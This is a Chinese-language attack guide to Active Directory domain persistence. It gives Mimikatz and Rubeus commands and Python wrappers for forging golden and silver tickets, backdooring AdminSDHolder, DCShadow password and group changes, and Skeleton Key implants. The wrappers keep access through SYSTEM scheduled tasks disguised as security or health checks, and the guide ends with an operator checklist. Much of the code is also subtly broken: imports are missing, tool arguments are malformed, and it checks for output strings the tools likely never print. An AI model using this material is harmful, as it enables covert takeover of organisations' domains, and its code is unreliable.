# 域权限维持 (Domain Persistence)

## 黄金/白银票据 (Golden/Silver Ticket)

### 黄金票据生成

#### 使用Mimikatz生成黄金票据
```batch
# 获取KRBTGT哈希
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# 生成黄金票据
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:hash /user:Administrator /ticket:golden.kirbi

# 使用黄金票据
mimikatz # kerberos::ptt golden.kirbi
mimikatz # misc::cmd
```

#### 使用Rubeus生成黄金票据
```powershell
# 获取必需信息
Rubeus.exe golden /tgtdeleg

# 生成黄金票据
Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:hash /user:Administrator /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi

# 导入票据
Rubeus.exe ptt /ticket:golden.kirbi
```

#### 黄金票据自动化生成
```python
# golden_ticket_generator.py
import subprocess
import hashlib
from datetime import datetime, timedelta

class GoldenTicketGenerator:
    def __init__(self, domain, domain_sid, krbtgt_hash):
        self.domain = domain
        self.domain_sid = domain_sid
        self.krbtgt_hash = krbtgt_hash
        self.ticket_lifetime = 10  # 年
    
    def generate_golden_ticket_mimikatz(self, username, user_id=500, groups="512,513,518,519,520"):
        """使用Mimikatz生成黄金票据"""
        
        # 构建Mimikatz命令
        mimikatz_cmd = f"""
privilege::debug
kerberos::golden /domain:{self.domain} /sid:{self.domain_sid} /krbtgt:{self.krbtgt_hash} /user:{username} /id:{user_id} /groups:{groups} /ticket:{username}_golden.kirbi /ptt
exit
"""
        
        # 写入临时文件
        with open('golden_ticket.txt', 'w') as f:
            f.write(mimikatz_cmd)
        
        # 执行Mimikatz
        try:
            result = subprocess.run(['mimikatz.exe', '/script:golden_ticket.txt'], 
                                  capture_output=True, text=True)
            
            if "Golden ticket for" in result.stdout:
                print(f"[+] Golden ticket generated for {username}")
                return True
            else:
                print(f"[!] Failed to generate golden ticket: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error running Mimikatz: {e}")
            return False
        finally:
            # 清理临时文件
            if os.path.exists('golden_ticket.txt'):
                os.remove('golden_ticket.txt')
    
    def generate_golden_ticket_rubeus(self, username, user_id=500, groups="512,513,518,519,520"):
        """使用Rubeus生成黄金票据"""
        
        # 构建Rubeus命令
        rubeus_cmd = [
            "Rubeus.exe", "golden",
            "/domain:", self.domain,
            "/sid:", self.domain_sid,
            "/krbtgt:", self.krbtgt_hash,
            "/user:", username,
            "/id:", str(user_id),
            "/groups:", groups,
            "/ticket:", f"{username}_golden.kirbi"
        ]
        
        try:
            result = subprocess.run(rubeus_cmd, capture_output=True, text=True)
            
            if "Golden ticket" in result.stdout:
                print(f"[+] Golden ticket generated for {username}")
                return True
            else:
                print(f"[!] Failed to generate golden ticket: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error running Rubeus: {e}")
            return False
    
    def create_persistent_golden_ticket(self, username, persistence_method="scheduled_task"):
        """创建持久化黄金票据"""
        
        # 生成黄金票据
        ticket_file = f"{username}_golden.kirbi"
        
        if self.generate_golden_ticket_rubeus(username):
            print(f"[+] Golden ticket created: {ticket_file}")
            
            # 根据选择的方法创建持久化
            if persistence_method == "scheduled_task":
                self.create_scheduled_task_persistence(username, ticket_file)
            elif persistence_method == "service":
                self.create_service_persistence(username, ticket_file)
            elif persistence_method == "registry":
                self.create_registry_persistence(username, ticket_file)
            
            return True
        
        return False
    
    def create_scheduled_task_persistence(self, username, ticket_file):
        """创建计划任务持久化"""
        
        task_name = f"SecurityUpdate_{username}"
        
        # 创建PowerShell脚本导入票据
        ps_script = f"""
$ticket = Get-Content "{ticket_file}" -Raw
Rubeus.exe ptt /ticket:$ticket
"""
        
        # 创建计划任务
        schtasks_cmd = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -Command '{ps_script}'" /sc daily /st 02:00 /ru SYSTEM
"""
        
        try:
            result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True)
            
            if "SUCCESS" in result.stdout:
                print(f"[+] Scheduled task persistence created: {task_name}")
                return True
        
        except Exception as e:
            print(f"[!] Error creating scheduled task: {e}")
        
        return False
```

### 白银票据生成

#### 白银票据基础
```batch
# 获取服务账户哈希
mimikatz # lsadump::dcsync /domain:corp.local /user:sqlservice

# 生成白银票据（针对特定服务）
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:service_hash /user:Administrator /service:MSSQLSvc /target:sql.corp.local /ticket:silver.kirbi

# 支持的白银票据服务类型
# HOST, CIFS, RPCSS, MSSQLSvc, HTTP, LDAP, WSMAN
```

#### 白银票据高级利用
```python
# silver_ticket_generator.py
class SilverTicketGenerator:
    def __init__(self, domain, domain_sid):
        self.domain = domain
        self.domain_sid = domain_sid
        self.service_types = {
            'cifs': {'spn': 'cifs/{target}', 'port': 445},
            'host': {'spn': 'host/{target}', 'port': 135},
            'http': {'spn': 'http/{target}', 'port': 80},
            'https': {'spn': 'http/{target}', 'port': 443},
            'ldap': {'spn': 'ldap/{target}', 'port': 389},
            'mssql': {'spn': 'mssqlsvc/{target}', 'port': 1433},
            'rpcss': {'spn': 'rpcss/{target}', 'port': 135},
            'wsman': {'spn': 'wsman/{target}', 'port': 5985}
        }
    
    def generate_silver_ticket(self, service_type, target_server, service_hash, username="Administrator"):
        """生成白银票据"""
        
        if service_type not in self.service_types:
            print(f"[!] Unsupported service type: {service_type}")
            return False
        
        service_config = self.service_types[service_type]
        spn = service_config['spn'].format(target=target_server)
        
        # 构建Rubeus命令
        rubeus_cmd = [
            "Rubeus.exe", "silver",
            "/domain:", self.domain,
            "/sid:", self.domain_sid,
            "/target:", target_server,
            "/service:", service_type.upper(),
            "/rc4:", service_hash,
            "/user:", username,
            "/ticket:", f"{service_type}_silver_{target_server}.kirbi"
        ]
        
        try:
            result = subprocess.run(rubeus_cmd, capture_output=True, text=True)
            
            if "Silver ticket" in result.stdout:
                print(f"[+] Silver ticket generated for {spn}")
                return True
            else:
                print(f"[!] Failed to generate silver ticket: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error generating silver ticket: {e}")
            return False
    
    def create_silver_ticket_persistence(self, target_servers, service_hashes):
        """创建白银票据持久化"""
        
        persistence_results = []
        
        for server, service_hash in zip(target_servers, service_hashes):
            for service_type in self.service_types.keys():
                if self.generate_silver_ticket(service_type, server, service_hash):
                    persistence_results.append({
                        'server': server,
                        'service': service_type,
                        'ticket_file': f"{service_type}_silver_{server}.kirbi",
                        'timestamp': datetime.now().isoformat()
                    })
        
        return persistence_results
```

## AdminSDHolder

### AdminSDHolder利用

#### AdminSDHolder基础
```powershell
# 检查AdminSDHolder权限
Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -Properties nTSecurityDescriptor

# 查看受保护的用户
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount

# 查看受保护的组
Get-ADGroup -Filter {AdminCount -eq 1} -Properties AdminCount
```

#### AdminSDHolder权限提升
```python
# admin_sdholder_exploit.py
import subprocess
from datetime import datetime

class AdminSDHolderExploit:
    def __init__(self, domain):
        self.domain = domain
        self.adminsdholder_dn = f"CN=AdminSDHolder,CN=System,{domain}"
    
    def get_adsd_holder_permissions(self):
        """获取AdminSDHolder权限"""
        
        ps_command = f"""
Import-Module ActiveDirectory
$adspath = "AD:\\{self.adminsdholder_dn}"
$acl = Get-Acl $adspath
$acl.Access | ForEach-Object {{
    [PSCustomObject]@{{
        IdentityReference = $_.IdentityReference
        AccessControlType = $_.AccessControlType
        ActiveDirectoryRights = $_.ActiveDirectoryRights
        IsInherited = $_.IsInherited
    }}
}} | ConvertTo-Json
"""
        
        try:
            result = subprocess.run(['powershell', '-Command', ps_command], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                permissions = json.loads(result.stdout)
                return permissions
        
        except Exception as e:
            print(f"[!] Error getting AdminSDHolder permissions: {e}")
        
        return []
    
    def add_user_to_adsd_holder(self, username, permissions="GenericAll"):
        """添加用户到AdminSDHolder"""
        
        ps_command = f"""
Import-Module ActiveDirectory
$adspath = "AD:\\{self.adminsdholder_dn}"
$acl = Get-Acl $adspath
$user = Get-ADUser "{username}"
$identity = New-Object System.Security.Principal.NTAccount("{self.domain}", "{username}")
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $identity,
    [System.DirectoryServices.ActiveDirectoryRights]::{permissions},
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($accessRule)
Set-Acl -Path $adspath -AclObject $acl
"""
        
        try:
            result = subprocess.run(['powershell', '-Command', ps_command], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] User {username} added to AdminSDHolder with {permissions} permissions")
                return True
            else:
                print(f"[!] Failed to add user to AdminSDHolder: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error adding user to AdminSDHolder: {e}")
            return False
    
    def create_adsd_holder_backdoor(self, backdoor_username):
        """创建AdminSDHolder后门"""
        
        print(f"[*] Creating AdminSDHolder backdoor for {backdoor_username}")
        
        # 1. 添加用户到AdminSDHolder
        if self.add_user_to_adsd_holder(backdoor_username):
            print(f"[+] User {backdoor_username} added to AdminSDHolder")
            
            # 2. 创建持久化机制
            persistence_script = f"""
# AdminSDHolder持久化脚本
$user = "{backdoor_username}"
$domain = "{self.domain}"

# 每60分钟检查一次权限
while ($true) {{
    $adspath = "AD:\\CN=AdminSDHolder,CN=System,$domain"
    $acl = Get-Acl $adspath
    $hasPermission = $acl.Access | Where-Object {{ $_.IdentityReference -like "*$user*" }}
    
    if (-not $hasPermission) {{
        # 重新添加权限
        $identity = New-Object System.Security.Principal.NTAccount($domain, $user)
        $accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $identity,
            [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
            [System.Security.AccessControl.AccessControlType]::Allow
        )
        $acl.AddAccessRule($accessRule)
        Set-Acl -Path $adspath -AclObject $acl
        Write-Host "[+] Re-applied AdminSDHolder permissions for $user"
    }}
    
    Start-Sleep -Seconds 3600
}}
"""
            
            # 创建计划任务运行持久化脚本
            task_name = f"AdminSDHMonitor_{backdoor_username}"
            schtasks_cmd = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -Command '{persistence_script}'" /sc hourly /ru SYSTEM
"""
            
            try:
                result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True)
                if "SUCCESS" in result.stdout:
                    print(f"[+] AdminSDHolder persistence created: {task_name}")
                    return True
            except Exception as e:
                print(f"[!] Error creating persistence: {e}")
        
        return False
```

## DCShadow

### DCShadow攻击

#### DCShadow基础实现
```python
# dcshadow_attack.py
import ldap3
import ssl
from ldap3 import Server, Connection, ALL, NTLM
import subprocess

class DCShadowAttack:
    def __init__(self, domain_controller, domain, username, password):
        self.domain_controller = domain_controller
        self.domain = domain
        self.username = username
        self.password = password
        self.ldap_connection = None
    
    def establish_ldap_connection(self):
        """建立LDAP连接"""
        try:
            server = Server(
                self.domain_controller,
                get_info=ALL,
                use_ssl=True,
                port=636
            )
            
            self.ldap_connection = Connection(
                server,
                user=f"{self.username}@{self.domain}",
                password=self.password,
                authentication=NTLM,
                auto_bind=True
            )
            
            print(f"[+] LDAP connection established to {self.domain_controller}")
            return True
            
        except Exception as e:
            print(f"[!] LDAP connection failed: {e}")
            return False
    
    def prepare_dcshadow_environment(self):
        """准备DCShadow环境"""
        
        # 1. 注册假域控制器
        fake_dc_name = f"DC-Shadow-{random.randint(1000, 9999)}"
        fake_dc_dn = f"CN={fake_dc_name},OU=Domain Controllers,DC={self.domain.replace('.', ',DC=')}"
        
        # 2. 修改SPN属性
        spn_modifications = [
            f"GC/{fake_dc_name}/{self.domain}",
            f"LDAP/{fake_dc_name}/{self.domain}",
            f"DRS/{fake_dc_name}/{self.domain}",
            f"E3514235-4B06-11D1-AB04-00C04FC2DCD2}/{fake_dc_name}@{self.domain}"
        ]
        
        print(f"[*] Preparing DCShadow environment with fake DC: {fake_dc_name}")
        
        return fake_dc_name, spn_modifications
    
    def execute_dcshadow_attack(self, target_user, new_password):
        """执行DCShadow攻击"""
        
        print(f"[*] Starting DCShadow attack on user: {target_user}")
        
        # 1. 准备环境
        fake_dc_name, spn_mods = self.prepare_dcshadow_environment()
        
        # 2. 使用Mimikatz执行DCShadow
        mimikatz_script = f"""
privilege::debug
misc::memssp
lsadump::dcshadow /object:{target_user} /attribute:unicodePwd /value:{new_password}
lsadump::dcshadow /push
exit
"""
        
        # 写入临时文件
        with open('dcshadow_script.txt', 'w') as f:
            f.write(mimikatz_script)
        
        try:
            # 执行Mimikatz DCShadow
            result = subprocess.run(['mimikatz.exe', '/script:dcshadow_script.txt'], 
                                  capture_output=True, text=True)
            
            if "DCShadow attack successful" in result.stdout:
                print(f"[+] DCShadow attack successful on {target_user}")
                print(f"[+] Password changed to: {new_password}")
                return True
            else:
                print(f"[!] DCShadow attack failed: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error executing DCShadow: {e}")
            return False
        finally:
            # 清理
            if os.path.exists('dcshadow_script.txt'):
                os.remove('dcshadow_script.txt')
    
    def create_dcshadow_backdoor(self, backdoor_user, backdoor_password):
        """创建DCShadow后门"""
        
        print(f"[*] Creating DCShadow backdoor for user: {backdoor_user}")
        
        # 1. 创建后门用户（如果尚不存在）
        self.create_backdoor_user(backdoor_user, backdoor_password)
        
        # 2. 使用DCShadow添加用户到特权组
        privilege_groups = [
            "CN=Domain Admins,CN=Users,DC={}".format(self.domain.replace('.', ',DC=')),
            "CN=Enterprise Admins,CN=Users,DC={}".format(self.domain.replace('.', ',DC=')),
            "CN=Schema Admins,CN=Users,DC={}".format(self.domain.replace('.', ',DC='))
        ]
        
        for group_dn in privilege_groups:
            # 使用DCShadow将用户添加到组
            self.add_user_to_group_dcshadow(backdoor_user, group_dn)
        
        # 3. 创建持久化机制
        self.create_dcshadow_persistence(backdoor_user)
        
        print(f"[+] DCShadow backdoor created for {backdoor_user}")
        return True
    
    def create_backdoor_user(self, username, password):
        """创建后门用户"""
        
        if not self.ldap_connection:
            if not self.establish_ldap_connection():
                return False
        
        try:
            # 检查用户是否已存在
            self.ldap_connection.search(
                search_base=f"DC={self.domain.replace('.', ',DC=')}",
                search_filter=f"(sAMAccountName={username})",
                attributes=['sAMAccountName']
            )
            
            if self.ldap_connection.entries:
                print(f"[*] User {username} already exists")
                return True
            
            # 创建新用户
            user_dn = f"CN={username},CN=Users,DC={self.domain.replace('.', ',DC=')}"
            user_attributes = {
                'objectClass': ['top', 'person', 'organizationalPerson', 'user'],
                'sAMAccountName': username,
                'userPrincipalName': f"{username}@{self.domain}",
                'displayName': username,
                'description': 'Service Account',
                'userAccountControl': 512  # 正常账户
            }
            
            self.ldap_connection.add(user_dn, attributes=user_attributes)
            
            if self.ldap_connection.result['result'] == 0:
                print(f"[+] User {username} created successfully")
                return True
            else:
                print(f"[!] Failed to create user: {self.ldap_connection.result['description']}")
                return False
        
        except Exception as e:
            print(f"[!] Error creating user: {e}")
            return False
```

## Skeleton Key

### Skeleton Key实现

#### Skeleton Key基础
```powershell
# Skeleton Key基础命令
mimikatz # privilege::debug
mimikatz # misc::skeleton

# 验证Skeleton Key
mimikatz # kerberos::ask /target:dc.corp.local /user:administrator /password:mimikatz
```

#### Skeleton Key高级利用
```python
# skeleton_key_implant.py
import ctypes
from ctypes import wintypes
import subprocess

class SkeletonKeyImplant:
    def __init__(self, skeleton_password="mimikatz"):
        self.skeleton_password = skeleton_password
        self.krbtgt_service_name = "KerberosKeyDistributionCenter"
    
    def check_skeleton_key_support(self):
        """检查Skeleton Key支持"""
        try:
            # 检查是否支持Skeleton Key（需要SYSTEM权限）
            result = subprocess.run(['sc', 'query', self.krbtgt_service_name], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] {self.krbtgt_service_name} service found")
                return True
            else:
                print(f"[!] {self.krbtgt_service_name} service not found")
                return False
        
        except Exception as e:
            print(f"[!] Error checking Skeleton Key support: {e}")
            return False
    
    def implant_skeleton_key(self):
        """植入Skeleton Key"""
        
        print(f"[*] Attempting to implant Skeleton Key with password: {self.skeleton_password}")
        
        # 使用Mimikatz植入Skeleton Key
        mimikatz_script = f"""
privilege::debug
misc::skeleton
exit
"""
        
        # 写入临时脚本文件
        with open('skeleton_implant.txt', 'w') as f:
            f.write(mimikatz_script)
        
        try:
            # 执行Mimikatz
            result = subprocess.run(['mimikatz.exe', '/script:skeleton_implant.txt'], 
                                  capture_output=True, text=True)
            
            if "Skeleton Key implanted" in result.stdout:
                print(f"[+] Skeleton Key implanted successfully")
                print(f"[+] Master password: {self.skeleton_password}")
                return True
            else:
                print(f"[!] Failed to implant Skeleton Key: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[!] Error implanting Skeleton Key: {e}")
            return False
        finally:
            # 清理临时文件
            if os.path.exists('skeleton_implant.txt'):
                os.remove('skeleton_implant.txt')
    
    def create_skeleton_key_persistence(self):
        """创建Skeleton Key持久化"""
        
        print("[*] Creating Skeleton Key persistence...")
        
        # 1. 植入Skeleton Key
        if self.implant_skeleton_key():
            print("[+] Skeleton Key implanted")
            
            # 2. 创建持久化机制
            # 使用计划任务定期检查Skeleton Key状态
            task_name = "KerberosHealthCheck"
            
            ps_script = f"""
# Skeleton Key持久化检查脚本
$skeleton_password = "{self.skeleton_password}"
$dc = "$env:COMPUTERNAME"

# 测试Skeleton Key是否仍然有效
try {{
    $result = klist purge 2>$null
    $test_auth = cmd /c "echo $skeleton_password | runas /user:Administrator cmd /c whoami" 2>$null
    
    if ($test_auth -match "Administrator") {{
        Write-Host "[+] Skeleton Key is still active"
    }} else {{
        Write-Host "[!] Skeleton Key may have been removed"
        # 重新植入Skeleton Key
        mimikatz.exe misc::skeleton
    }}
}} catch {{
    Write-Host "[!] Error checking Skeleton Key status"
}}
"""
            
            # 创建计划任务
            schtasks_cmd = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -Command '{ps_script}'" /sc daily /st 03:00 /ru SYSTEM
"""
            
            try:
                result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True)
                
                if "SUCCESS" in result.stdout:
                    print(f"[+] Skeleton Key persistence created: {task_name}")
                    return True
            except Exception as e:
                print(f"[!] Error creating persistence: {e}")
        
        return False
    
    def verify_skeleton_key(self, target_dc):
        """验证Skeleton Key是否有效"""
        
        print(f"[*] Verifying Skeleton Key on {target_dc}")
        
        # 使用Skeleton Key密码进行认证测试
        test_command = f"""
# 测试Skeleton Key认证
$dc = "{target_dc}"
$skeleton_password = "{self.skeleton_password}"

# 尝试使用Skeleton Key密码进行认证
$secure_password = ConvertTo-SecureString $skeleton_password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("Administrator", $secure_password)

try {{
    $session = New-PSSession -ComputerName $dc -Credential $credential -ErrorAction Stop
    if ($session) {{
        Write-Host "[+] Skeleton Key authentication successful!"
        Remove-PSSession $session
        return $true
    }}
}} catch {{
    Write-Host "[!] Skeleton Key authentication failed"
    return $false
}}
"""
        
        try:
            result = subprocess.run(['powershell', '-Command', test_command], 
                                  capture_output=True, text=True)
            
            if "successful" in result.stdout:
                print(f"[+] Skeleton Key verification successful on {target_dc}")
                return True
            else:
                print(f"[!] Skeleton Key verification failed on {target_dc}")
                return False
        
        except Exception as e:
            print(f"[!] Error verifying Skeleton Key: {e}")
            return False
```

---

## 实战检查清单

### 黄金/白银票据
- [ ] KRBTGT哈希已获取
- [ ] 黄金票据已生成
- [ ] 白银票据已创建
- [ ] 票据已导入
- [ ] 持久化已配置

### AdminSDHolder
- [ ] AdminSDHolder权限已检查
- [ ] 用户权限已添加
- [ ] 持久化机制已创建
- [ ] 定时任务已配置
- [ ] 权限已验证

### DCShadow
- [ ] DCShadow环境已准备
- [ ] 假域控制器已注册
- [ ] SPN已修改
- [ ] DCShadow攻击已执行
- [ ] 后门已创建

### Skeleton Key
- [ ] Skeleton Key已植入
- [ ] 主密码已设置
- [ ] 持久化已配置
- [ ] 认证已验证
- [ ] 监控已部署